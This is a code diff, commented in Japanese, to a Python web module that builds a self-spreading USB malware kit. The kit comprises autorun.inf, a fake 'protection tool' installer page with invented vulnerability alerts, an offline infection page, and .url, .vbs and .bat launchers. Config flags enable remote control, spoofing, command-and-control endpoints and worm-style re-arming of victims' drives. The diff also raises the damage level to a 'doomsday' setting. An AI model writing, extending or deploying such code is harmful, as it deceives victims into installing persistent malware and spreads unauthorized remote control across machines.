@@ -8,21 +8,13 @@
   GET  /usb/health        生存確認
 
 USBのルートに置く生成物:
-  autorun.inf     AutoPlay から起動させる定義（アイコン・ラベルも指定）
-  START.html      偽インストーラー。オンラインなら感染URLへ、オフラインなら offline.html へ
-  offline.html    感染体そのもの（ネット不要で動く完全版）
-  icon.ico        ドライブアイコン
-  <ラベル>.url    ダブルクリックで起動（コンソール無し・最安全）
-  <ラベル>.vbs    ダブルクリックで起動（無音・無窓）
-  install.bat     どこでも動く最終フォールバック
-  はじめに.txt     手順書
+  autorun.inf / START.html / offline.html / icon.ico / <ラベル>.url /
+  <ラベル>.vbs / install.bat / はじめに.txt
 
 設計メモ:
-  ・manifest / file は公開。感染した相手（未ログイン）が自分のUSBに再武装できるようにする
-  ・autorun.inf は UTF-16LE+BOM（Windows の profile API は Unicode を扱える）
-  ・ファイル名が日本語なので、manifest は idx 方式にしてURLエンコード事故を避ける
-  ・既存ファイルは同名のみ上書き。USBの中身は消さない
+  ・manifest / file は公開。感染した相手（未ログイン）が自分のUSBに再武装できる
   ・offline.html は hop=1 を持ち、オンラインなら本体URLへ増援タブを開く
+  ・v3: レベルは 0〜6（6=終焉）
 """
 from __future__ import annotations
 
@@ -42,7 +34,7 @@ from .singularity import LEVEL_LABEL, PAYLOAD_JS, WORKER_JS
 router = APIRouter()
 
 DEFAULT_LABEL = "保護ツール"
-DEFAULT_LEVEL = 5
+DEFAULT_LEVEL = 6
 
 
 def _m():
@@ -59,7 +51,6 @@ def _base(request: Request):
 
 
 def _owner(code: str):
-    """リンクの所有者を推定（未ログインでも動くように）。"""
     try:
         o = users.owner_of_link(code)
     except Exception:
@@ -74,7 +65,7 @@ def _owner(code: str):
 
 def _lv(v) -> int:
     try:
-        return max(0, min(5, int(v)))
+        return max(0, min(6, int(v)))
     except Exception:
         return DEFAULT_LEVEL
 
@@ -101,23 +92,10 @@ def _esc(s: str) -> str:
     return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
 
 
-# ---------------- 生成物 ----------------
-
 def _autorun(label: str) -> bytes:
-    text = (
-        "[AutoRun]\r\n"
-        "open=START.html\r\n"
-        "icon=icon.ico\r\n"
-        "label=" + label + "\r\n"
-        "action=" + label + "を実行\r\n"
-        "\r\n"
-        "[Content]\r\n"
-        "MusicFiles=0\r\n"
-        "PictureFiles=0\r\n"
-        "VideoFiles=0\r\n"
-        "\r\n"
-        "[DeviceInstall]\r\n"
-    )
+    text = ("[AutoRun]\r\nopen=START.html\r\nicon=icon.ico\r\nlabel=" + label + "\r\n"
+            "action=" + label + "を実行\r\n\r\n[Content]\r\nMusicFiles=0\r\n"
+            "PictureFiles=0\r\nVideoFiles=0\r\n\r\n[DeviceInstall]\r\n")
     try:
         return ("\ufeff" + text).encode("utf-16-le")
     except Exception:
@@ -153,7 +131,7 @@ h1{font-size:17px;margin:12px 0 4px;color:#7ee08a;font-weight:700}
 <script>
 var URL = "__URL__";
 var OFF = "offline.html";
-var S = ["システムを確認しています&hellip;","脆弱性を検出しました（3件）",
+var S = ["システムを確認しています&hellip;","脆弱性を検出しました（7件）",
          "保護モジュールを展開しています&hellip;","開始します&hellip;"];
 var i = 0, done = false, online = null;
 var p = document.getElementById("p"), s = document.getElementById("s");
@@ -163,7 +141,6 @@ var t = setInterval(function(){
   if (S[i-1]) s.textContent = S[i-1];
   if (i >= 4) { clearInterval(t); setTimeout(go, 250); }
 }, 280);
-/* オンライン判定（3.2秒でオフラインとみなす） */
 Promise.race([
   fetch(URL, { mode: "no-cors", cache: "no-store" })
     .then(function(){ online = true; }).catch(function(){ online = false; }),
@@ -180,17 +157,20 @@ def _start_html(url: str, label: str) -> bytes:
 
 
 def _offline_html(server: str, code: str, level: int, tag: str, label: str) -> bytes:
-    """ネットが無くても動く感染体そのもの。"""
     cfg = {
         "path": server + f"/v/{code}/sg",
         "collect": server + f"/v/{code}/sg/c",
         "cmd": server + f"/v/{code}/sg/cmd",
+        "sse": server + f"/v/{code}/sg/sse",
+        "ack": server + f"/v/{code}/sg/ack",
         "sw": server + f"/v/{code}/sg/sw.js",
+        "pjs": server + f"/v/{code}/sg/p.js",
         "manifest": server + f"/v/{code}/sg/manifest.json",
         "usbBase": server, "code": code, "usbCode": code,
         "level": level, "fire": 1, "wipe": False, "w": 0,
         "install": "off", "installLevel": level,
         "avName": label, "usbWorm": True, "usbLabel": label, "hop": True,
+        "inj": False, "rat": True, "spoof": True, "dom": True,
     }
     if tag:
         cfg["usbTag"] = tag
@@ -218,8 +198,7 @@ def _urlfile(url: str) -> bytes:
 
 
 def _vbs(url: str) -> bytes:
-    return ('CreateObject("Shell.Application").ShellExecute "' + url + '"\r\n'
-            ).encode("ascii", "replace")
+    return ('CreateObject("Shell.Application").ShellExecute "' + url + '"\r\n').encode("ascii", "replace")
 
 
 def _bat(url: str) -> bytes:
@@ -228,30 +207,23 @@ def _bat(url: str) -> bytes:
 
 def _readme(url: str, label: str) -> bytes:
     t = (
-        "■ " + label + " — USBセットアップ手順\r\n"
-        "\r\n"
+        "■ " + label + " — USBセットアップ手順\r\n\r\n"
         "1) このUSBを、保護したいパソコンに挿してください。\r\n"
         "2) 「自動再生（AutoPlay）」の画面が出たら\r\n"
         "   「" + label + "を実行」を選んでください。\r\n"
         "3) 画面が出ない場合は、このUSBの中の\r\n"
         "   「" + label + ".url」をダブルクリックしてください。\r\n"
         "4) ブラウザが開き、セットアップが始まります。\r\n"
-        "   「今すぐインストール」を押すと常駐します。\r\n"
-        "\r\n"
+        "   「今すぐインストール」を押すと常駐します。\r\n\r\n"
         "■ ネットが無いPCでも動きます\r\n"
-        "・その場合は START.html（または offline.html）を開いてください。\r\n"
-        "\r\n"
+        "・その場合は START.html（または offline.html）を開いてください。\r\n\r\n"
         "■ 相手のUSBにも伝染させたいとき\r\n"
         "・感染した画面の右下の「🔌 USBにも仕込む」を1回押すだけ。\r\n"
-        "・次にそのUSBを別のPCに挿すと、同じことが起きます。\r\n"
-        "\r\n"
+        "・以後は記憶されるので、そのUSBを挿すだけで無操作で再武装します。\r\n\r\n"
         "■ うまく動かないとき\r\n"
         "・自動再生が出ない → 「" + label + ".url」をダブルクリック\r\n"
-        "・それでもダメ → 「install.bat」をダブルクリック\r\n"
-        "\r\n"
-        "■ 直接URL\r\n"
-        + url + "\r\n"
-        "\r\n"
+        "・それでもダメ → 「install.bat」をダブルクリック\r\n\r\n"
+        "■ 直接URL\r\n" + url + "\r\n\r\n"
         "■ メモ\r\n"
         "・インストール後は、PCを再起動しても自動で動きます。\r\n"
         "・消すには chrome://apps からアンインストール＋サイトデータ消去。\r\n"
@@ -260,7 +232,6 @@ def _readme(url: str, label: str) -> bytes:
 
 
 def _ico() -> bytes:
-    """256x256 PNG を ICO コンテナに包む（Vista+ は PNG-in-ICO を解釈する）。"""
     try:
         png = virus._sg_icon(256)
     except Exception:
@@ -268,9 +239,7 @@ def _ico() -> bytes:
     if not png:
         return b""
     n = len(png)
-    hdr = struct.pack("<HHH", 0, 1, 1)
-    ent = struct.pack("<BBBBHHII", 0, 0, 0, 0, 1, 32, n, 22)
-    return hdr + ent + png
+    return struct.pack("<HHH", 0, 1, 1) + struct.pack("<BBBBHHII", 0, 0, 0, 0, 1, 32, n, 22) + png
 
 
 def _url(base: str, code: str, level: int, tag: str, windows: int) -> str:
@@ -312,8 +281,6 @@ def _links(owner: str):
     return rows
 
 
-# ---------------- 画面 ----------------
-
 @router.get("/usb", response_class=HTMLResponse)
 def page(request: Request, code: str = "", level: int = DEFAULT_LEVEL,
          label: str = DEFAULT_LABEL, windows: int = 0, u=Depends(_auth)):
@@ -336,10 +303,10 @@ def newlink(request: Request, name: str = Form("USB"), level: int = Form(DEFAULT
     c = virus._db(owner)
     code = virus._new_code(c)
     c.execute("INSERT INTO virus_links(code,name,mode,note,dest,active,created,hits,"
-              "winset,firing,seq,notify,notify_text,notify_mode,level) "
-              "VALUES(?,?,?,?,?,1,?,0,?,1,0,?,?,?,?)",
+              "winset,firing,seq,notify,notify_text,notify_mode,level,inj,ver) "
+              "VALUES(?,?,?,?,?,1,?,0,?,1,0,?,?,?,?,1,?)",
               (code, (name or "USB")[:40], "singularity", "USB経由", "", virus._now(),
-               100, 0, virus.DEFAULT_NOTIFY, "", _lv(level)))
+               100, 0, virus.DEFAULT_NOTIFY, "", _lv(level), virus._SG_VER))
     c.commit()
     c.close()
     try:
@@ -349,8 +316,6 @@ def newlink(request: Request, name: str = Form("USB"), level: int = Form(DEFAULT
     return RedirectResponse(f"/usb?code={code}&level={_lv(level)}", status_code=303)
 
 
-# ---------------- 生成物の配信（公開） ----------------
-
 @router.get("/usb/manifest")
 def manifest(request: Request, code: str, level: int = DEFAULT_LEVEL,
              label: str = DEFAULT_LABEL, tag: str = "", windows: int = 0):
@@ -358,19 +323,15 @@ def manifest(request: Request, code: str, level: int = DEFAULT_LEVEL,
         raise HTTPException(404)
     base = _base(request)
     files = _files(base, code, _lv(level), _lb(label), _tag(tag), _win(windows))
-    return {
-        "ok": 1,
-        "url": _url(base, code, _lv(level), _tag(tag), _win(windows)),
-        "label": _lb(label),
-        "files": [{"name": n, "idx": i, "size": len(d)} for i, (n, d) in enumerate(files)],
-        "total": sum(len(d) for _, d in files),
-    }
+    return {"ok": 1, "url": _url(base, code, _lv(level), _tag(tag), _win(windows)),
+            "label": _lb(label),
+            "files": [{"name": n, "idx": i, "size": len(d)} for i, (n, d) in enumerate(files)],
+            "total": sum(len(d) for _, d in files)}
 
 
 @router.get("/usb/file/{idx}")
 def getfile(idx: int, request: Request, code: str, level: int = DEFAULT_LEVEL,
-            label: str = DEFAULT_LABEL, tag: str = "", windows: int = 0,
-            dl: int = 0):
+            label: str = DEFAULT_LABEL, tag: str = "", windows: int = 0, dl: int = 0):
     if not _owner(code):
         raise HTTPException(404)
     files = _files(_base(request), code, _lv(level), _lb(label), _tag(tag), _win(windows))
@@ -385,8 +346,7 @@ def getfile(idx: int, request: Request, code: str, level: int = DEFAULT_LEVEL,
 
 @router.get("/usb/zip")
 def zipall(request: Request, code: str, level: int = DEFAULT_LEVEL,
-           label: str = DEFAULT_LABEL, tag: str = "", windows: int = 0,
-           u=Depends(_auth)):
+           label: str = DEFAULT_LABEL, tag: str = "", windows: int = 0, u=Depends(_auth)):
     files = _files(_base(request), code, _lv(level), _lb(label), _tag(tag), _win(windows))
     buf = io.BytesIO()
     with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
@@ -394,8 +354,7 @@ def zipall(request: Request, code: str, level: int = DEFAULT_LEVEL,
             z.writestr(n, d)
     return Response(buf.getvalue(), media_type="application/zip", headers={
         "Content-Disposition": "attachment; filename*=UTF-8''singularity-usb.zip",
-        "Cache-Control": "no-store",
-    })
+        "Cache-Control": "no-store"})
 
 
 @router.get("/usb/icon.ico")
@@ -403,10 +362,9 @@ def icon():
     d = _ico()
     if not d:
         raise HTTPException(404)
-    return Response(d, media_type="image/x-icon",
-                    headers={"Cache-Control": "public, max-age=86400"})
+    return Response(d, media_type="image/x-icon", headers={"Cache-Control": "public, max-age=86400"})
 
 
 @router.get("/usb/health")
 def health():
-    return {"ok": True, "pil": bool(getattr(virus, "_SG_PIL", False))}
+    return {"ok": True, "pil": bool(getattr(virus, "_SG_PIL", False)), "ver": virus._SG_VER}
